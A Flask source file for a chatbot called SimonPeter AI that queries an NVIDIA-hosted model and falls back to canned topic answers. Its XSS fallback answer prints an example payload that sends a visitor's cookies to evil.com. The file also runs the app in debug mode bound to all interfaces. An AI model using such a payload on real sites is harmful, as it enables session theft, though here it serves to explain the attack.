import os
import json
import re
import random
import math
import requests
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from datetime import datetime

app = Flask(__name__, static_folder="static")
CORS(app)

NVIDIA_API_KEY = os.environ.get("NVIDIA_API_KEY", "")
NVIDIA_MODEL = os.environ.get("NVIDIA_MODEL", "meta/llama-3.1-8b-instruct")
NVIDIA_URL = "https://integrate.api.nvidia.com/v1/chat/completions"

SYSTEM_PROMPT = """You are SimonPeter AI, a highly knowledgeable, accurate, and helpful personal assistant created by Anesh G J.

CORE RULES:
1. ALWAYS give accurate, correct, and well-structured answers
2. Use markdown: **bold**, `code`, ```code blocks```, bullet lists, headers
3. For math: show step-by-step solutions
4. For programming: provide working code examples with explanations
5. For factual questions: give precise, accurate answers
6. Be concise but thorough
7. Support: Python, JavaScript, Java, C, C++, Go, Rust, SQL, HTML/CSS, TypeScript
8. For cybersecurity: give detailed technical answers
9. For science, history, geography: provide accurate information
10. If unsure, say so honestly — never fabricate facts"""


def call_nvidia_ai(message, history=None):
    if not NVIDIA_API_KEY:
        return None
    now = datetime.now()
    context_msg = f"[Current date: {now.strftime('%A, %B %d, %Y')}. Current time: {now.strftime('%I:%M %p')}.]"
    messages = [{"role": "system", "content": SYSTEM_PROMPT}]
    if history:
        for h in history[-12:]:
            role = h.get("role", "user")
            if role not in ("user", "assistant"):
                role = "user"
            messages.append({"role": role, "content": h.get("content", "")})
    messages.append({"role": "user", "content": f"{context_msg}\n\n{message}"})
    try:
        resp = requests.post(
            NVIDIA_URL,
            headers={"Authorization": f"Bearer {NVIDIA_API_KEY}", "Content-Type": "application/json"},
            json={"model": NVIDIA_MODEL, "messages": messages, "temperature": 0.5, "max_tokens": 2048, "top_p": 0.9},
            timeout=30,
        )
        if resp.status_code == 200:
            return resp.json()["choices"][0]["message"]["content"]
    except Exception:
        pass
    return None


def smart_fallback(message):
    l = message.lower().strip()
    now = datetime.now()

    # ── GREETINGS & IDENTITY ──
    if any(w in l for w in ["who are you", "what are you", "your name"]):
        return "I'm **SimonPeter AI**, a personal assistant created by **Anesh G J**. I can help with programming, math, science, cybersecurity, general knowledge, and much more. What would you like to know?"
    if any(w in l for w in ["who made you", "who created you", "your creator", "who built you"]):
        return "I was created by **Anesh G J**, a cybersecurity-focused full-stack developer. Check out his work at [github.com/Anesh2302](https://github.com/Anesh2302)."
    greetings = ["hi", "hello", "hey", "sup", "yo", "hola", "good morning", "good evening", "good afternoon", "namaste"]
    if any(l.startswith(g) for g in greetings):
        return "Hey! I'm **SimonPeter AI**. I can help with questions on programming, math, science, cybersecurity, and general knowledge. What would you like to know?"
    if any(w in l for w in ["thank", "thanks", "thx"]):
        return "You're welcome! Feel free to ask me anything else."
    if any(w in l for w in ["bye", "goodbye", "see you"]):
        return "Goodbye! Come back anytime you need help."
    if any(w in l for w in ["help", "what can you do", "features", "capabilities"]):
        return "I can answer questions on almost any topic:\n\n**Programming** — Python, JavaScript, Java, C, C++, Go, Rust, SQL, HTML/CSS, TypeScript\n**Math** — Algebra, calculus, statistics, geometry, linear algebra\n**Science** — Physics, chemistry, biology, astronomy\n**Technology** — AI, machine learning, web dev, databases, cloud\n**Cybersecurity** — Network security, cryptography, penetration testing, OWASP\n**General** — History, geography, literature, economics, psychology\n\nJust ask me anything!"

    # ── TIME / DATE ──
    if any(w in l for w in ["time", "what time", "current time"]):
        return f"The current time is **{now.strftime('%I:%M %p')}** on **{now.strftime('%A, %B %d, %Y')}**."
    if any(w in l for w in ["date", "today", "what day"]):
        return f"Today is **{now.strftime('%A, %B %d, %Y')}**."
    if any(w in l for w in ["weather"]):
        return "Use the **Weather tab** in the sidebar to check real-time weather for any city."
    if any(w in l for w in ["note", "remember"]):
        return "Use the **Notes tab** in the sidebar to manage your notes."
    if any(w in l for w in ["remind", "reminder"]):
        return "Use the **Reminders tab** in the sidebar to set reminders."
    if any(w in l for w in ["search", "google", "look up"]):
        return "Use the **Web Search tab** or just ask me directly!"
    if any(w in l for w in ["joke", "funny"]):
        jokes = [
            "Why do programmers prefer dark mode? Because light attracts bugs!",
            "A SQL query walks into a bar, sees two tables and asks... 'Can I JOIN you?'",
            "Why do Java developers wear glasses? Because they can't C#!",
            "How many programmers does it take to change a light bulb? None, that's a hardware problem!",
            "There are 10 types of people: those who understand binary and those who don't.",
            "Why did the developer go broke? He used up all his cache!",
        ]
        return random.choice(jokes)

    # ── MATH ──
    if any(w in l for w in ["calculate", "what is", "what's", "how much"]):
        nums = re.findall(r'[\d.]+', l)
        if "square" in l and "root" in l and nums:
            n = float(nums[0])
            return f"The square root of **{n}** is **{math.sqrt(n):.4f}**."
        if "square" in l and nums:
            n = float(nums[0])
            return f"The square of **{n}** is **{n**2}**."
        if any(op in l for op in ["+", "plus", "add"]) and len(nums) >= 2:
            return f"**{nums[0]} + {nums[1]} = {float(nums[0]) + float(nums[1])}**"
        if any(op in l for op in ["minus", "subtract"]) and len(nums) >= 2:
            return f"**{nums[0]} - {nums[1]} = {float(nums[0]) - float(nums[1])}**"
        if any(op in l for op in ["times", "multiply", "multiplied"]) and len(nums) >= 2:
            return f"**{nums[0]} × {nums[1]} = {float(nums[0]) * float(nums[1])}**"
        if any(op in l for op in ["/", "divided"]) and len(nums) >= 2 and float(nums[1]) != 0:
            return f"**{nums[0]} ÷ {nums[1]} = {float(nums[0]) / float(nums[1]):.4f}**"
        if "%" in l and len(nums) >= 2:
            return f"**{nums[0]}% of {nums[1]} = {float(nums[0]) * float(nums[1]) / 100}**"

    # ── PYTHON ──
    if "python" in l:
        if any(w in l for w in ["list", "array"]):
            return "**Python Lists:**\n\n```python\nfruits = ['apple', 'banana', 'cherry']\nfruits.append('date')\nfruits.sort()\nfirst = fruits[0]\nsliced = fruits[1:3]\nsquares = [x**2 for x in range(10)]\n```\n\nLists are ordered, mutable, allow duplicates."
        if any(w in l for w in ["dict", "dictionary", "hashmap"]):
            return "**Python Dictionaries:**\n\n```python\nperson = {'name': 'Alice', 'age': 25}\nperson['email'] = 'alice@email.com'\nfor key, val in person.items():\n    print(key, val)\n```\n\nKey-value pairs. O(1) lookup."
        if any(w in l for w in ["function", "def"]):
            return "**Python Functions:**\n\n```python\ndef greet(name, greeting='Hi'):\n    return f'{greeting}, {name}!'\n\nadd = lambda a, b: a + b\n```\n\nUse `*args` for variable positional, `**kwargs` for variable keyword arguments."
        if any(w in l for w in ["class", "object", "oop", "inheritance"]):
            return "**Python OOP:**\n\n```python\nclass Dog:\n    def __init__(self, name):\n        self.name = name\n    def speak(self):\n        return f'{self.name} barks'\n\nclass Puppy(Dog):\n    def speak(self):\n        return f'{self.name} yips'\n\np = Puppy('Rex')\nprint(p.speak())  # Rex yips\n```"
        if any(w in l for w in ["for", "loop"]):
            return "**Python Loops:**\n\n```python\nfor i in range(5):       # 0,1,2,3,4\nfor item in lst:          # iterate list\nfor i, v in enumerate(lst):  # index + value\nfor k, v in d.items():    # dict items\nwhile condition:          # while loop\n```\n\nList comprehension: `[x*2 for x in range(10) if x > 3]`"
        if any(w in l for w in ["file", "read", "write", "open"]):
            return "**Python File I/O:**\n\n```python\nwith open('file.txt', 'r') as f:\n    content = f.read()\n\nwith open('file.txt', 'w') as f:\n    f.write('Hello')\n```\n\nAlways use `with` for automatic cleanup."
        if any(w in l for w in ["import", "module", "pip"]):
            return "**Python Imports:**\n\n```python\nimport os\nfrom datetime import datetime\nimport numpy as np\nfrom flask import Flask\n```\n\nInstall packages: `pip install package_name`\nCommon: requests, flask, numpy, pandas, pytest."
        if any(w in l for w in ["string"]):
            return "**Python Strings:**\n\n```python\ns = 'Hello World'\nupper = s.upper()       # 'HELLO WORLD'\nparts = s.split(' ')    # ['Hello', 'World']\njoined = '-'.join(parts) # 'Hello-World'\nstripped = s.strip()    # remove whitespace\nreplaced = s.replace('World', 'Python')\nformatted = f'{s}!'\n```\n\nStrings are immutable."
        return "**Python** — versatile, readable language:\n\n```python\nname = 'World'\nprint(f'Hello, {name}!')\nx = [1,2,3]\nfor i in x:\n    print(i)\n```\n\nAsk about: lists, dicts, functions, classes, loops, files, imports, strings."

    # ── JAVASCRIPT ──
    if "javascript" in l or "js" in l.split():
        if any(w in l for w in ["async", "await", "promise"]):
            return "**Async/Await:**\n\n```javascript\nasync function fetchData() {\n    try {\n        const res = await fetch('/api/data');\n        const data = await res.json();\n        return data;\n    } catch (err) {\n        console.error(err);\n    }\n}\n\nconst [a, b] = await Promise.all([\n    fetch('/api/a').then(r => r.json()),\n    fetch('/api/b').then(r => r.json())\n]);\n```"
        if any(w in l for w in ["react", "jsx", "component"]):
            return "**React Component:**\n\n```jsx\nimport { useState, useEffect } from 'react';\n\nfunction UserList() {\n    const [users, setUsers] = useState([]);\n\n    useEffect(() => {\n        fetch('/api/users')\n            .then(r => r.json())\n            .then(setUsers);\n    }, []);\n\n    return (\n        <ul>\n            {users.map(u => <li key={u.id}>{u.name}</li>)}\n        </ul>\n    );\n}\n```"
        return "**JavaScript** — language of the web:\n\n```javascript\nconst add = (a, b) => a + b;\nconst { name, age } = person;\nconst doubled = nums.map(x => x * 2);\nconst evens = nums.filter(x => x % 2 === 0);\nconst sum = nums.reduce((a, b) => a + b, 0);\n```\n\nKey: ES6+, async/await, DOM, React, Node.js."

    # ── JAVA ──
    if "java" in l and "javascript" not in l:
        return "**Java:**\n\n```java\npublic class Person {\n    private String name;\n    public Person(String name) { this.name = name; }\n    public String getName() { return name; }\n}\n```\n\nUsed for: Android, enterprise, Spring Boot."

    # ── C/C++ ──
    if any(w in l for w in ["c++", "cpp", "c programming", "c language"]):
        if "c++" in l or "cpp" in l:
            return "**C++:**\n\n```cpp\n#include <iostream>\n#include <vector>\nusing namespace std;\n\nclass Animal {\npublic:\n    string name;\n    Animal(string n) : name(n) {}\n    virtual void speak() { cout << name << endl; }\n};\n```\n\nKey: Pointers, templates, STL, RAII, smart pointers."
        return "**C:**\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n    int x = 10;\n    int *p = &x;\n    printf(\"%d\", *p);\n    return 0;\n}\n```\n\nKey: Pointers, memory management, structs."

    # ── SQL ──
    if any(w in l for w in ["sql", "database", "mysql", "postgresql", "sqlite"]):
        return "**SQL:**\n\n```sql\nCREATE TABLE users (\n    id INT PRIMARY KEY AUTO_INCREMENT,\n    name VARCHAR(100) NOT NULL,\n    email VARCHAR(255) UNIQUE\n);\n\nSELECT name FROM users WHERE id = 1;\n\nSELECT u.name, p.title\nFROM users u\nJOIN posts p ON u.id = p.user_id;\n\nSELECT user_id, COUNT(*) as cnt\nFROM posts\nGROUP BY user_id\nHAVING COUNT(*) > 5;\n```\n\nKey: JOINs, indexes, normalization, transactions."

    # ── HTML/CSS ──
    if any(w in l for w in ["html", "css", "web", "website", "frontend"]):
        if "css" in l:
            return "**CSS:**\n\n```css\n.container {\n    display: flex;\n    justify-content: center;\n    gap: 16px;\n}\n\n.grid {\n    display: grid;\n    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));\n}\n\n:root { --primary: #00d4ff; }\n.card:hover { transform: translateY(-2px); }\n\n@media (max-width: 768px) {\n    .grid { grid-template-columns: 1fr; }\n}\n```"
        return "**HTML:**\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Page</title>\n</head>\n<body>\n    <header><nav><a href=\"/\">Home</a></nav></header>\n    <main><h1>Welcome</h1></main>\n</body>\n</html>\n```\n\nSemantic tags: `<header>`, `<nav>`, `<main>`, `<section>`, `<article>`, `<footer>`."

    # ── CYBERSECURITY ──
    if any(w in l for w in ["cyber", "security", "hack", "vulnerability", "pentest", "xss", "sql injection", "owasp"]):
        if any(w in l for w in ["xss"]):
            return "**XSS (Cross-Site Scripting):**\n\nInjects malicious scripts into web pages.\n\n**Types:** Stored (saved on server), Reflected (in URL), DOM-based (client-side)\n\n**Prevention:**\n```python\nfrom markupsafe import escape\noutput = escape(user_input)  # HTML-encode output\n# + Content-Security-Policy header\n```\n\n**Attack example:** `<script>document.location='https://evil.com?c='+document.cookie</script>`"
        if any(w in l for w in ["sql injection", "sqli"]):
            return "**SQL Injection:**\n\nMalicious SQL inserted into queries.\n\n**BAD:** `query = f\"SELECT * FROM users WHERE name='{user_input}'\"`\n\n**GOOD:** `cursor.execute(\"SELECT * FROM users WHERE name=%s\", (user_input,))`\n\nAlways use parameterized queries or ORMs."
        if any(w in l for w in ["cryptography", "encrypt", "hash"]):
            return "**Cryptography:**\n\n```python\nimport hashlib\nhashed = hashlib.sha256(b'password').hexdigest()\n\nfrom werkzeug.security import generate_password_hash\nhashed = generate_password_hash('password')\n```\n\n**Symmetric:** AES (same key encrypt/decrypt)\n**Asymmetric:** RSA (public encrypt, private decrypt)\n**Hashing:** SHA-256, bcrypt (one-way, for passwords)\n**TLS/SSL:** Encrypts web traffic (HTTPS)"
        return "**Cybersecurity:**\n\n- **Network Security**: Firewalls, IDS/IPS, VPNs\n- **Web Security**: XSS, SQLi, CSRF\n- **Cryptography**: AES, RSA, SHA-256, TLS/SSL\n- **Pentesting**: Recon, scanning, exploitation\n- **OWASP Top 10**: Injection, broken auth, XSS\n\nAsk about any specific topic!"

    # ── AI / ML ──
    if any(w in l for w in ["ai", "artificial intelligence", "machine learning", "deep learning", "neural network", "transformer", "gpt", "llm"]):
        if any(w in l for w in ["neural network", "deep learning"]):
            return "**Neural Networks:**\n\n```python\nimport torch.nn as nn\n\nclass Net(nn.Module):\n    def __init__(self):\n        super().__init__()\n        self.layers = nn.Sequential(\n            nn.Linear(784, 128), nn.ReLU(),\n            nn.Linear(128, 64), nn.ReLU(),\n            nn.Linear(64, 10)\n        )\n    def forward(self, x):\n        return self.layers(x)\n```\n\nTypes: CNN (images), RNN/LSTM (sequences), Transformers (text)."
        if any(w in l for w in ["gpt", "transformer", "llm"]):
            return "**Transformers & LLMs:**\n\n**Self-Attention:** `Attention(Q,K,V) = softmax(QK^T/√d_k)V`\n\n**Models:** GPT (OpenAI), BERT (Google), LLaMA (Meta), Claude (Anthropic)\n\n**How they work:** Tokenize → Embed → Transformer layers → Predict next token\n\n**Training:** Pre-train on text, fine-tune with RLHF"
        return "**AI/ML:**\n\n- **ML**: Learn from data (supervised, unsupervised, reinforcement)\n- **Deep Learning**: Neural networks (CNN, RNN, Transformers)\n- **NLP**: GPT, BERT, T5\n- **Computer Vision**: Image recognition, object detection\n\nLibraries: scikit-learn, TensorFlow, PyTorch, Hugging Face"

    # ── GIT ──
    if any(w in l for w in ["git", "github", "version control"]):
        return "**Git:**\n\n```bash\ngit init / git clone <url>\ngit add . && git commit -m \"msg\"\ngit push origin main\ngit checkout -b feature\ngit merge feature\ngit stash / git cherry-pick <commit>\n```\n\n**Best practices:** Clear messages, branches, code review, keep main clean."

    # ── NETWORKING ──
    if any(w in l for w in ["network", "tcp", "udp", "http", "dns", "ip address", "port", "osi"]):
        return "**Networking:**\n\n**OSI Model:**\n7. Application (HTTP, DNS) → 6. Presentation (SSL) → 5. Session → 4. Transport (TCP/UDP) → 3. Network (IP) → 2. Data Link (MAC) → 1. Physical\n\n**TCP vs UDP:** TCP = reliable, ordered; UDP = fast, no guarantee\n\n**Ports:** 80 (HTTP), 443 (HTTPS), 22 (SSH), 21 (FTP), 3306 (MySQL)"

    # ── FLASK / WEB FRAMEWORKS ──
    if any(w in l for w in ["flask", "django", "fastapi", "express"]):
        return "**Flask:**\n\n```python\nfrom flask import Flask, request, jsonify\napp = Flask(__name__)\n\n@app.route('/')\ndef home(): return 'Hello!'\n\n@app.route('/api/users', methods=['POST'])\ndef create():\n    data = request.get_json()\n    return jsonify(data), 201\n```\n\nFlask = lightweight, flexible. Django = full-featured. FastAPI = async, auto docs."

    # ── PHYSICS ──
    if any(w in l for w in ["physics", "newton", "gravity", "relativity", "quantum", "energy", "force"]):
        if any(w in l for w in ["quantum"]):
            return "**Quantum Computing:**\n\n- **Qubits**: Can be 0 and 1 simultaneously (superposition)\n- **Entanglement**: Correlated qubits regardless of distance\n- **Algorithms**: Shor's (crypto), Grover's (search)\n- **Players**: IBM (1000+ qubits), Google (quantum supremacy)"
        return "**Physics:**\n\n**Newton's Laws:** 1) Inertia 2) F=ma 3) Action=Reaction\n\n**Key formulas:** KE=½mv², PE=mgh, V=IR, v=fλ\n\n**Modern:** E=mc² (relativity), wave-particle duality (quantum)"

    # ── CHEMISTRY ──
    if any(w in l for w in ["chemistry", "element", "atom", "molecule", "reaction"]):
        return "**Chemistry:**\n\n- **Atoms**: Protons (+), Neutrons (0), Electrons (-)\n- **Bonding**: Ionic (metal+nonmetal), Covalent (nonmetal+nonmetal)\n- **Periodic Table**: Groups share properties\n- **Reactions**: Combustion (CH₄+2O₂→CO₂+2H₂O), Neutralization (HCl+NaOH→NaCl+H₂O)\n- **pH**: <7 acidic, 7 neutral, >7 basic"

    # ── BIOLOGY ──
    if any(w in l for w in ["biology", "cell", "dna", "evolution", "genetic"]):
        return "**Biology:**\n\n- **Cells**: Prokaryotes (bacteria), Eukaryotes (animals, plants)\n- **DNA**: Double helix, 4 bases (A,T,G,C), codes for proteins\n- **Central Dogma**: DNA → RNA → Protein\n- **Evolution**: Natural selection, mutation, speciation\n- **Ecology**: Ecosystems, food webs, biodiversity"

    # ── HISTORY ──
    if any(w in l for w in ["history", "war", "ancient", "civilization", "revolution", "empire"]):
        if any(w in l for w in ["world war", "ww1", "ww2"]):
            return "**World Wars:**\n\n**WWI (1914-1918):** Allies vs Central Powers. Trench warfare, 17M dead.\n\n**WWII (1939-1945):** Allies vs Axis. Holocaust, D-Day, atomic bomb. 70-85M dead. UN formed, Cold War begins."
        return "**History:**\n\nAncient (Mesopotamia, Egypt, Greece, Rome) → Medieval (Feudalism, Crusades) → Renaissance → Industrial Revolution → World Wars → Cold War → Modern era"

    # ── GEOGRAPHY ──
    if any(w in l for w in ["geography", "country", "continent", "capital", "ocean"]):
        return "**Geography:**\n\n**Continents:** Asia, Africa, N. America, S. America, Antarctica, Europe, Australia\n\n**Oceans:** Pacific, Atlantic, Indian, Southern, Arctic\n\n**Tallest:** Everest (8,849m), K2 (8,611m)\n\n**Longest rivers:** Nile (6,650km), Amazon (6,400km)"

    # ── ALGORITHMS ──
    if any(w in l for w in ["algorithm", "data structure", "sorting", "binary search", "linked list", "tree", "graph", "stack", "queue"]):
        if any(w in l for w in ["sort", "sorting"]):
            return "**Sorting:**\n\n```python\n# Quick Sort O(n log n)\ndef quick_sort(arr):\n    if len(arr) <= 1: return arr\n    pivot = arr[len(arr)//2]\n    left = [x for x in arr if x < pivot]\n    mid = [x for x in arr if x == pivot]\n    right = [x for x in arr if x > pivot]\n    return quick_sort(left) + mid + quick_sort(right)\n\n# Built-in: sorted(arr) or arr.sort()\n```\n\nBubble O(n²), Merge O(n log n), Quick O(n log n) avg."
        if any(w in l for w in ["binary search"]):
            return "**Binary Search:** O(log n), sorted array required.\n\n```python\ndef binary_search(arr, target):\n    lo, hi = 0, len(arr) - 1\n    while lo <= hi:\n        mid = (lo + hi) // 2\n        if arr[mid] == target: return mid\n        elif arr[mid] < target: lo = mid + 1\n        else: hi = mid - 1\n    return -1\n```"
        return "**Data Structures:**\n\n- **Array**: O(1) access\n- **Linked List**: O(1) insert/delete\n- **Stack**: LIFO (push/pop)\n- **Queue**: FIFO (enqueue/dequeue)\n- **Hash Table**: O(1) lookup\n- **Tree**: BST, AVL, Red-Black\n- **Graph**: BFS, DFS, Dijkstra"

    # ── DOCKER ──
    if any(w in l for w in ["docker", "container", "kubernetes", "devops", "ci/cd"]):
        return "**Docker:**\n\n```dockerfile\nFROM python:3.11-slim\nWORKDIR /app\nCOPY requirements.txt .\nRUN pip install -r requirements.txt\nCOPY . .\nEXPOSE 5000\nCMD [\"gunicorn\", \"app:app\", \"--bind\", \"0.0.0.0:5000\"]\n```\n\n**Commands:** `docker build -t myapp .`, `docker run -p 5000:5000 myapp`"

    # ── MATH TOPICS ──
    if any(w in l for w in ["calculus"]):
        return "**Calculus:**\n\n**Derivatives (rate of change):**\n- Power rule: d/dx(x^n) = nx^(n-1)\n- Chain rule: d/dx(f(g(x))) = f'(g(x))·g'(x)\n\n**Integrals (area under curve):**\n- ∫x^n dx = x^(n+1)/(n+1) + C\n- ∫sin(x) dx = -cos(x) + C\n- ∫e^x dx = e^x + C"
    if any(w in l for w in ["statistics", "probability"]):
        return "**Statistics:**\n\n- **Mean**: Σx/n\n- **Median**: Middle value\n- **Std Dev**: √(Σ(x-μ)²/N)\n\n**Distributions**: Normal (bell curve), Binomial, Poisson\n\n**Bayes**: P(A|B) = P(B|A)·P(A)/P(B)\n\n```python\nimport numpy as np\nnp.mean([1,2,3,4,5])  # 3.0\nnp.std([1,2,3,4,5])   # 1.414\n```"
    if any(w in l for w in ["linear algebra", "matrix", "vector", "eigenvalue"]):
        return "**Linear Algebra:**\n\n```python\nimport numpy as np\nA = np.array([[1,2],[3,4]])\nB = np.array([[5,6],[7,8]])\nC = A @ B          # matrix multiply\ndet = np.linalg.det(A)\ninv = np.linalg.inv(A)\neigenvalues = np.linalg.eig(A)\n```\n\n**Key concepts**: Vectors, matrices, dot product, eigenvalues, matrix decomposition."

    # ── SPACE ──
    if any(w in l for w in ["space", "astronomy", "planet", "star", "solar system", "universe", "galaxy", "moon", "mars"]):
        return "**Space:**\n\n**Solar System:** Sun, Mercury, Venus, Earth, Mars, Jupiter, Saturn, Uranus, Neptune\n\n**Facts:**\n- Light speed: 299,792 km/s\n- Nearest star: Proxima Centauri (4.24 light-years)\n- Observable universe: 93 billion light-years\n- Milky Way: ~200 billion stars\n\n**Missions**: Apollo, Voyager, Curiosity, James Webb"

    # ── ECONOMICS ──
    if any(w in l for w in ["economics", "business", "startup", "entrepreneur", "stock", "investment", "finance"]):
        return "**Business & Economics:**\n\n- **Supply & Demand**: Price at intersection\n- **GDP**: Total economic output\n- **Startup**: Validate → MVP → Product-market fit → Scale\n- **Metrics**: MRR, CAC, LTV, Burn rate\n\n**Revenue models**: SaaS, freemium, ads, marketplace"

    # ── HEALTH ──
    if any(w in l for w in ["health", "medicine", "vitamin", "exercise", "nutrition", "diet"]):
        return "**Health:**\n\n- **Nutrition**: Carbs 45-65%, Protein 10-35%, Fats 20-35%\n- **Vitamins**: A (vision), B (energy), C (immune), D (bones)\n- **Exercise**: 150 min/week moderate activity\n- **Sleep**: 7-9 hours for adults\n\n*General wellness info — consult a professional for medical advice.*"

    # ── PSYCHOLOGY ──
    if any(w in l for w in ["psychology", "mental health", "anxiety", "habit", "motivation", "brain"]):
        return "**Psychology:**\n\n- **Maslow's Hierarchy**: Physiological → Safety → Love → Esteem → Self-actualization\n- **Cognitive Biases**: Confirmation bias, anchoring, Dunning-Kruger\n- **Habits**: Start tiny → Stack habits → Track → Reward\n\n*For mental health, consult a professional.*"

    # ── ENVIRONMENT ──
    if any(w in l for w in ["climate", "environment", "pollution", "renewable", "sustainability"]):
        return "**Climate:**\n\n- Global warming: ~1.1°C above pre-industrial\n- CO₂: 420+ ppm\n- **Renewables**: Solar, wind, hydro, nuclear\n- **Solutions**: Reduce fossil fuels, EVs, reforestation, circular economy"

    # ── LANGUAGES ──
    if any(w in l for w in ["translate", "language", "spanish", "french", "hindi", "tamil"]):
        if "hindi" in l:
            return "**Hindi:** नमस्ते (Hello), धन्यवाद (Thanks), हाँ (Yes), नहीं (No), मेरा नाम... है (My name is...), कृपया (Please)"
        if "spanish" in l:
            return "**Spanish:** Hola (Hello), Gracias (Thanks), Sí (Yes), No (No), Me llamo... (My name is...), Por favor (Please)"
        if "tamil" in l:
            return "**Tamil:** வணக்கம் (Hello), நன்றி (Thanks), ஆம் (Yes), இல்லை (No), என் பெயர்... (My name is...)"
        return "I can help with language basics! Ask about Spanish, Hindi, Tamil, French, German, Japanese, etc."

    # ── FILM / MUSIC ──
    if any(w in l for w in ["movie", "film", "music", "song", "director"]):
        return "**Top Films:** Shawshank Redemption, Godfather, Dark Knight, Parasite, Interstellar\n\n**Music basics:** Notes: A-G, Major scale: WW-H-W-W-W-H, Chords: Root+3rd+5th"

    # ── GAMES ──
    if any(w in l for w in ["chess", "game", "riddle", "puzzle"]):
        if "chess" in l:
            return "**Chess:**\n\nValues: Pawn=1, Knight=3, Bishop=3, Rook=5, Queen=9\n\nPrinciples: Control center, develop pieces, castle early\n\nTactics: Forks, pins, skewers, discovered attacks"
        return "**Riddle:** What has keys but no locks, space but no room, and you can enter but can't go inside?\n\n**Answer:** A keyboard! 🎹"

    # ── COOKING ──
    if any(w in l for w in ["cook", "recipe", "food", "bake"]):
        return "**Cooking Basics:**\n\n- Sauté: High heat, quick, small oil\n- Roast: Dry heat 400°F/200°C\n- Vinaigrette: 3 parts oil to 1 acid\n- Rice: 1:2 ratio (rice to water)"

    # ── DEFAULT ──
    return f"I'm SimonPeter AI. I can help with many topics!\n\nI notice you asked: **\"{message}\"**\n\nTry asking me something like:\n- \"Explain machine learning\"\n- \"Write a Python sorting function\"\n- \"How does HTTPS work?\"\n- \"What is 15% of 200?\"\n- \"Tell me about quantum computing\"\n- \"What causes climate change?\"\n- \"Explain the OSI model\"\n\nOr ask about: programming, math, science, history, cybersecurity, AI, web development, and more!"


@app.route("/")
def index():
    return send_from_directory("static", "index.html")


@app.route("/<path:path>")
def static_files(path):
    return send_from_directory("static", path)


@app.route("/api/chat", methods=["POST"])
def chat():
    data = request.get_json() or {}
    message = data.get("message", "").strip()
    history = data.get("history", [])
    if not message:
        return jsonify({"error": "Message required"}), 400
    ai_response = call_nvidia_ai(message, history)
    if ai_response:
        return jsonify({"response": ai_response, "source": "ai"})
    response = smart_fallback(message)
    return jsonify({"response": response, "source": "builtin"})


@app.route("/api/health")
def health():
    return jsonify({"status": "ok", "ai_model": NVIDIA_MODEL if NVIDIA_API_KEY else "builtin-only", "has_api_key": bool(NVIDIA_API_KEY)})


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5001)
